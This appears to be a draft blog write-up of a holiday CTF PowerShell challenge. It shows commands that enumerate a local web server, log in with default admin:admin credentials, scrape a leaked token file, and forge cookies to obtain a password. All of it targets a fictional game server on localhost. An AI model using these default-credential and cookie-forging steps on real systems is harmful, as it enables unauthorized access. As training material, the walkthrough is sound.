+++
title = 'Powershell'
date = 2024-11-23T13:18:37+01:00
draft = true
weight = 3
+++


### Silver

#### Task 1

> 1) There is a file in the current directory called 'welcome.txt'. Read the contents of this file

```powershell
Get-Content -Path ".\welcome.txt"
```

**Output**

```
System Overview
The Elf Weaponry Multi-Factor Authentication (MFA) system safeguards access to a classified armory containing elf weapons. This high-security system is equipped with advanced defense mechanisms, including canaries, retinal scanner and keystroke analyzing, to prevent unauthorized access. In the event of suspicious activity, the system automatically initiates a lockdown, restricting all access until manual override by authorized personnel.

Lockdown Protocols
When the system enters lockdown mode, all access to the armory is frozen. This includes both entry to and interaction with the weaponry storage. The defense mechanisms become active, deploying logical barriers to prohibit unauthorized access. During this state, users cannot disable the system without the intervention of an authorized administrator. The system logs all access attempts and alerts central command when lockdown is triggered.

Access and System Restoration
To restore access to the system, users must follow strict procedures. First, authorized personnel must identify the scrambled endpoint. Next, they must deactivate the defense mechanisms by entering the override code and presenting the required token. After verification, the system will resume standard operation, and access to weaponry is reactivated.
```

#### Task 2

> 2) Geez that sounds ominous, I'm sure we can get past the defense mechanisms. 
> We should warm up our PowerShell skills. 
> How many words are there in the file? 

```powershell
(Get-Content -Path ".\welcome.txt" -Raw) -split '\s+' | Where-Object { $_ -ne '' } | Measure-Object | Select-Object -ExpandProperty Count
```

**Output**

```
180
```

#### Task 3

> 3) There is a server listening for incoming connections on this machine, that must be the weapons terminal. What port is it listening on?

```powershell
netstat -an | Select-String 'LISTEN'
```

**Output**

```
tcp        0      0 127.0.0.1:1225          0.0.0.0:*               LISTEN     
unix  2      [ ACC ]     STREAM     LISTENING     350156949 /tmp/CoreFxPipe_PSHos
t.DB3DA5D4.143.None.pwsh
unix  2      [ ACC ]     STREAM     LISTENING     350148184 /tmp/tmux-1050/default
unix  2      [ ACC ]     STREAM     LISTENING     350154640 /tmp/dotnet-diagnosti
c-143-25076401-socket
```

#### Task 4

> 4) You should enumerate that webserver. Communicate with the server using HTTP, what status code do you get? 

```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:1225"
```

**Output**

```
Invoke-WebRequest: Response status code does not indicate success: 401 (UNAUTHORIZED).
```

#### Task 5

> 5) It looks like defensive measures are in place, it is protected by basic authentication. 
> Try authenticating with a standard admin username and password.

```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:1225" -Headers @{ Authorization = "Basic $([Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes('admin:admin')))" } -UseBasicParsing
```

**Output**

```
StatusCode        : 200
StatusDescription : OK
Content           : <html>
                    <body>
                    <pre>
                    ----------------------------------------------------
                    🪖 Elf MFA webserver🪖
                    ⚔️ Grab your tokens for access to weaponry ⚔️
                    ⚔️ Warning! Sensitive information on the server, protect a…
RawContent        : HTTP/1.1 200 OK
                    Server: Werkzeug/3.0.6
                    Server: Python/3.10.12
                    Date: Sat, 23 Nov 2024 13:04:34 GMT
                    Connection: close
                    Content-Type: text/html; charset=utf-8
                    Content-Length: 3475
                    
                    <html>
                    <body>
                    <pre>
                    ---…
Headers           : {[Server, System.String[]], [Date, System.String[]], [Connection, System.String[]], [Content-Type, System.String[]]…}
Images            : {}
InputFields       : {}
Links             : {@{outerHTML=<a href="http://localhost:1225/endpoints/1">Endpoint 1</a>; tagName=A; href=http://localhost:1225/endpoints/1}, @{outerHTML=<a href="http://localhost:1225/endpoints/2">Endpoint 2</a>; tagName=A; href=htt
                    p://localhost:1225/endpoints/2}, @{outerHTML=<a href="http://localhost:1225/endpoints/3">Endpoint 3</a>; tagName=A; href=http://localhost:1225/endpoints/3}, @{outerHTML=<a href="http://localhost:1225/endpoints/4">End
                    point 4</a>; tagName=A; href=http://localhost:1225/endpoints/4}…}
RawContentLength  : 3475
RelationLink      : {}
```

#### Task 6

> 6) There are too many endpoints here. 
> Use a loop to download the contents of each page. What page has 138 words? 
> When you find it, communicate with the URL and print the contents to the terminal. 

```powershell
# Define the base URL and credentials
$baseUrl = "http://127.0.0.1:1225"
$credentials = "admin:admin"
$encodedAuth = [Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes($credentials))

# Set the headers for authorization
$headers = @{ Authorization = "Basic $encodedAuth" }

# Perform the initial web request to get the main page content
$response = Invoke-WebRequest -Uri $baseUrl -Headers $headers -UseBasicParsing

# Filter the links to those that match the endpoint pattern
$endpointLinks = $response.Links | Where-Object { $_.href -like "http://localhost:1225/endpoints/*" }

# Loop through each endpoint link
foreach ($link in $endpointLinks) {
    # Request the content of the current endpoint
    $pageContent = Invoke-WebRequest -Uri $link.href -Headers $headers -UseBasicParsing

    # Split the content into words and check if it contains exactly 138 words
    if (($pageContent.Content -split '\s+').Count -eq 138) {
        # Output the found page and its content
        Write-Output "Found page with 138 words: $($link.href)"
        Write-Output $pageContent.Content
        break  # Stop searching after finding the first matching page
    }
}
```

**Output**

```
Found page with 138 words: http://localhost:1225/endpoints/13                                                           
<html><head><title>MFA token scrambler</title></head><body><p>Yuletide cheer fills the air,<br>    A season of love, of care.<br>    The world is bright, full of light,<br>    As we celebrate this special night.<br>    The tree is trimmed, the stockings hung,<br>    Carols are sung, bells are rung.<br>    Families gather, friends unite,<br>    In the glow of the fire’s light.<br>    The air is filled with joy and peace,<br>    As worries and cares find release.<br>    Yuletide cheer, a gift so dear,<br>    Brings warmth and love to all near.<br>    May we carry it in our hearts,<br>    As the season ends, as it starts.<br>    Yuletide cheer, a time to share,<br>    The love, the joy, the care.<br>    May it guide us through the year,<br>    In every laugh, in every tear.<br>    Yuletide cheer, a beacon bright,<br>    Guides us through the winter night </p><p> Note to self, remember to remove temp csvfile at http://127.0.0.1:1225/token_overview.csv</p></body></html>
```

#### Task 7

> 7) There seems to be a csv file in the comments of that page. 
 That could be valuable, read the contents of that csv-file!

```powershell
# Define the base URL and credentials
$baseUrl = "http://127.0.0.1:1225"
$credentials = "admin:admin"
$encodedAuth = [Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes($credentials))
$headers = @{ Authorization = "Basic $encodedAuth" }

# Perform the initial web request to get the main page content
$response = Invoke-WebRequest -Uri $baseUrl -Headers $headers -UseBasicParsing

# Filter the links to those that match the endpoint pattern
$endpointLinks = $response.Links | Where-Object { $_.href -like "http://localhost:1225/endpoints/*" }

# Loop through each endpoint link
foreach ($link in $endpointLinks) {
    # Request the content of the current endpoint
    $pageContent = Invoke-WebRequest -Uri $link.href -Headers $headers -UseBasicParsing
    
    # Check if the content has exactly 138 words
    if (($pageContent.Content -split '\s+').Count -eq 138) {
        # Search for a CSV URL in the content
        if ($pageContent.Content -match '(http[^"]+\.csv)') {
            $csvUrl = $matches[1]  # Extract the CSV URL from the match
            
            # Fetch the CSV content from the extracted URL
            $csvContent = Invoke-WebRequest -Uri $csvUrl -Headers $headers -UseBasicParsing
            $csvContent.Content | Write-Output  # Output the CSV content
        }
        break  # Stop searching after finding the first matching page
    }
}
```

**Output**

```
6ef5570cd43a3ec9f43c57f662201e55,REDACTED
bf189d47c3175ada98af398669e3cac3,REDACTED
743ac25389a0b430dd9f8e72b2ec9d7f,REDACTED
270aabd5feaaf40185f2effa9fa2cd6e,REDACTED
8b58850ee66bd2ab7dd2f5f850c855f8,REDACTED
6fd00cbda10079b1d55283a88680d075,REDACTED
612001dd92369a7750c763963bc327f0,REDACTED
010f2cc580f74521c86215b7374eead6,REDACTED
29860c67296d808bc6506175a8cbb422,REDACTED
7b7f6891b6b6ab46fe2e85651db8205f,REDACTED
45ffb41c4e458d08a8b08beeec2b4652,REDACTED
d0e6bfb6a4e6531a0c71225f0a3d908d,REDACTED
bd7efda0cb3c6d15dd896755003c635c,REDACTED
5be8911ced448dbb6f0bd5a24cc36935,REDACTED
1acbfea6a2dad66eb074b17459f8c5b6,REDACTED
0f262d0003bd696550744fd43cd5b520,REDACTED
8cac896f624576d825564bb30c7250eb,REDACTED
8ef6d2e12a58d7ec521a56f25e624b80,REDACTED
b4959370a4c484c10a1ecc53b1b56a7d,REDACTED
38bdd7748a70529e9beb04b95c09195d,REDACTED
8d4366f08c013f5c0c587b8508b48b15,REDACTED
67566692ca644ddf9c1344415972fba8,REDACTED
8fbf4152f89b7e309e89b9f7080c7230,REDACTED
936f4db24a290032c954073b3913f444,REDACTED
c44d8d6b03dcd4b6bf7cb53db4afdca6,REDACTED
cb722d0b55805cd6feffc22a9f68177d,REDACTED
724d494386f8ef9141da991926b14f9b,REDACTED
67c7aef0d5d3e97ad2488babd2f4c749,REDACTED
5f8dd236f862f4507835b0e418907ffc,4216B4FAF4391EE4D3E0EC53A372B2F24876ED5D124FE08E227F84D687A7E06C
# [*] SYSTEMLOG
# [*] Defence mechanisms activated, REDACTING endpoints, starting with sensitive endpoints
# [-] ERROR, memory corruption, not all endpoints have been REDACTED
# [*] Verification endpoint still active
# [*] http://127.0.0.1:1225/tokens/<sha256sum>
# [*] Contact system administrator to unlock panic mode
# [*] Site functionality at minimum to keep weapons active
```

#### Task 8

> 8) Luckily the defense mechanisms were faulty! 
> There seems to be one api-endpoint that still isn't redacted! Communicate with that endpoint! 

```powershell
$response = Invoke-WebRequest -Uri "http://127.0.0.1:1225" -Headers @{ Authorization = "Basic $([Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes('admin:admin')))" } -UseBasicParsing; 
$response.Links | Where-Object { $_.href -like "http://localhost:1225/endpoints/*" } | ForEach-Object { 
    $pageContent = Invoke-WebRequest -Uri $_.href -Headers @{ Authorization = "Basic $([Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes('admin:admin')))" } -UseBasicParsing; 
    if (($pageContent.Content -split '\s+').Count -eq 138) { 
        if ($pageContent.Content -match '(http[^"]+\.csv)') { 
            $csvUrl = $matches[1]; 
            $csvContent = Invoke-WebRequest -Uri $csvUrl -Headers @{ Authorization = "Basic $([Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes('admin:admin')))" } -UseBasicParsing; 
            # Split each line by comma and return the last value (assumed hash)
            $csvContent.Content -split "`n" | Where-Object { $_ -match '\b[a-fA-F0-9]{64}\b' } | ForEach-Object { 
                $fields = $_ -split ','   # Split the line by comma
                $sha256sum = $fields[-1]  # Get the last field (SHA256 hash)
                
                # Send a web request with the SHA256 hash
                $url = "http://127.0.0.1:1225/tokens/$sha256sum"
                $response = Invoke-WebRequest -Uri $url -Headers @{
                    Authorization = "Basic $([Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes('admin:admin')))"
                } -Method Get -UseBasicParsing
                
                # Output the response or relevant data
                $response.Content
            }
        } 
        break 
    } 
}
```

**Output**

```
<h1>[!] ERROR: Missing Cookie 'token'</h1>                                                                              
```

#### Task 9

> 9) It looks like it requires a cookie token, set the cookie and try again.


```powershell
# Fetch the content from the URL
$response = Invoke-WebRequest -Uri "http://127.0.0.1:1225/token_overview.csv" -Headers @{
    Authorization = "Basic $([Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes('admin:admin')))"
} -UseBasicParsing

# Split the content into lines, filter out lines containing 'REDACTED', '#', 'file_MD5hash', or 'Sha256(file_MD5hash)'
$filteredContent = $response.Content -split "`n" | Where-Object { 
    $_ -notmatch "REDACTED" -and 
    $_ -notmatch "#" -and 
    $_ -notmatch "file_MD5hash" -and 
    $_ -notmatch "Sha256\(file_MD5hash\)" 
}

# Convert the filtered lines into an object (in-memory CSV structure)
$csvData = $filteredContent | ForEach-Object {
    $fields = $_ -split ","  # Split each line by commas into an array of fields
    [PSCustomObject]@{
        Column1 = $fields[0]
        Column2 = $fields[1]
    }
}

$sha256Sum = $csvData.Column2
$md5Sum = $csvData.Column1

$response = Invoke-WebRequest -Uri "http://127.0.0.1:1225/tokens/$sha256Sum" -Headers @{
    Authorization = "Basic $([Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes('admin:admin')))"
    Cookie = "token=$md5Sum"
} -UseBasicParsing

$response.Content
```

Alternatively, I also used this - but the challenge text didn't change, but the output is nevertheless the same:

```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:1225/tokens/4216B4FAF4391EE4D3E0EC53A372B2F24876ED5D124FE08E227F84D687A7E06C" -Headers @{ 'Cookie' = "token=5f8dd236f862f4507835b0e418907ffc" } -Credential "admin" -AllowUnencryptedAuthentication;

```

**Output**

```
StatusCode        : 200
StatusDescription : OK
Content           : <h1>Cookie 'mfa_code', use it at <a href='1732382646.3496673'>/mfa_validate/4216B4FAF4391EE4D3E
                    0EC53A372B2F24876ED5D124FE08E227F84D687A7E06C</a></h1>
RawContent        : HTTP/1.1 200 OK
                    Server: Werkzeug/3.0.6
                    Server: Python/3.10.12
                    Date: Sat, 23 Nov 2024 17:24:06 GMT
                    Connection: close
                    Content-Type: text/html; charset=utf-8
                    Content-Length: 149
                    
                    <h1>Cookie 'mfa_code', u…
Headers           : {[Server, System.String[]], [Date, System.String[]], [Connection, System.String[]], [Content-Ty
                    pe, System.String[]]…}
Images            : {}
InputFields       : {}
Links             : {@{outerHTML=<a href='1732382646.3496673'>/mfa_validate/4216B4FAF4391EE4D3E0EC53A372B2F24876ED5
                    D124FE08E227F84D687A7E06C</a>; tagName=A; href=1732382646.3496673}}
RawContentLength  : 149
RelationLink      : {}
```

#### Task 10

> 10) Sweet we got a MFA token! We might be able to get access to the system.
 Validate that token at the endpoint!

```powershell
# Fetch the content from the URL
$response = Invoke-WebRequest -Uri "http://127.0.0.1:1225/token_overview.csv" -Headers @{
    Authorization = "Basic $([Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes('admin:admin')))"
} -UseBasicParsing

# Split the content into lines, filter out lines containing 'REDACTED', '#', 'file_MD5hash', or 'Sha256(file_MD5hash)'
$filteredContent = $response.Content -split "`n" | Where-Object { 
    $_ -notmatch "REDACTED" -and 
    $_ -notmatch "#" -and 
    $_ -notmatch "file_MD5hash" -and 
    $_ -notmatch "Sha256\(file_MD5hash\)" 
}

# Convert the filtered lines into an object (in-memory CSV structure)
$csvData = $filteredContent | ForEach-Object {
    $fields = $_ -split ","  # Split each line by commas into an array of fields
    [PSCustomObject]@{
        Column1 = $fields[0]
        Column2 = $fields[1]
    }
}

$sha256Sum = $csvData.Column2
$md5Sum = $csvData.Column1

$response = Invoke-WebRequest -Uri "http://127.0.0.1:1225/tokens/$sha256Sum" -Headers @{
    Authorization = "Basic $([Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes('admin:admin')))"
    Cookie = "token=$md5Sum"
} -UseBasicParsing

$time_code = [regex]::match($response.Content,"href='(.+)'").Groups[1].Value
$urlpath = [regex]::match($response.Content,"'>(.+)</a>").Groups[1].Value

$response = Invoke-WebRequest -Uri "http://127.0.0.1:1225$urlpath" -Headers @{
    Authorization = "Basic $([Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes('admin:admin')))"
    Cookie = "mfa_code=$time_code; token=$md5Sum; mfa_token=$time_code"
} -UseBasicParsing

$response.Content
```

**Output**

```
Q29ycmVjdCBUb2tlbiBzdXBwbGllZCwgeW91IGFyZSBncmFudGVkIGFjY2VzcyB0byB0aGUgc25vdyBjYW5ub24gdGVybWluYWwuIEhlcmUgaXMgeW91ciBwZXJzb25hbCBwYXNzd29yZCBmb3IgYWNjZXNzOiBTbm93TGVvcGFyZDJSZWFkeUZvckFjdGlvbg==
```

Inside the HTML there is a Base64 string, which decodes to: 

```
Correct Token supplied, you are granted access to the snow cannon terminal. Here is your personal password for access: SnowLeopard2ReadyForAction
```

#### Task 11

> 11) That looks like base64! Decode it so we can get the final secret!

```powershell
# Fetch the content from the URL
$response = Invoke-WebRequest -Uri "http://127.0.0.1:1225/token_overview.csv" -Headers @{
    Authorization = "Basic $([Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes('admin:admin')))"
} -UseBasicParsing

# Split the content into lines, filter out lines containing 'REDACTED', '#', 'file_MD5hash', or 'Sha256(file_MD5hash)'
$filteredContent = $response.Content -split "`n" | Where-Object { 
    $_ -notmatch "REDACTED" -and 
    $_ -notmatch "#" -and 
    $_ -notmatch "file_MD5hash" -and 
    $_ -notmatch "Sha256\(file_MD5hash\)" 
}

# Convert the filtered lines into an object (in-memory CSV structure)
$csvData = $filteredContent | ForEach-Object {
    $fields = $_ -split ","  # Split each line by commas into an array of fields
    [PSCustomObject]@{
        Column1 = $fields[0]
        Column2 = $fields[1]
    }
}

$sha256Sum = $csvData.Column2
$md5Sum = $csvData.Column1

$response = Invoke-WebRequest -Uri "http://127.0.0.1:1225/tokens/$sha256Sum" -Headers @{
    Authorization = "Basic $([Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes('admin:admin')))"
    Cookie = "token=$md5Sum"
} -UseBasicParsing

$time_code = [regex]::match($response.Content,"href='(.+)'").Groups[1].Value
$urlpath = [regex]::match($response.Content,"'>(.+)</a>").Groups[1].Value

$response = Invoke-WebRequest -Uri "http://127.0.0.1:1225$urlpath" -Headers @{
    Authorization = "Basic $([Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes('admin:admin')))"
    Cookie = "mfa_code=$time_code; token=$md5Sum; mfa_token=$time_code"
} -UseBasicParsing

[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String([regex]::match($response.Content,"<p>(.+)</p>").Groups[1].Value))
```

**Output 1**

```
Correct Token supplied, you are granted access to the snow cannon terminal. Here is your personal password for access: SnowLeopard2ReadyForAction
```

#### Final

> Hurray! You have thwarted their defenses!
> Alabaster can now access their weaponry and put a stop to it.
> Once HHC grants your achievement, you can close this terminal.

![Powershell silver final](/images/act2/powershell-1.png)

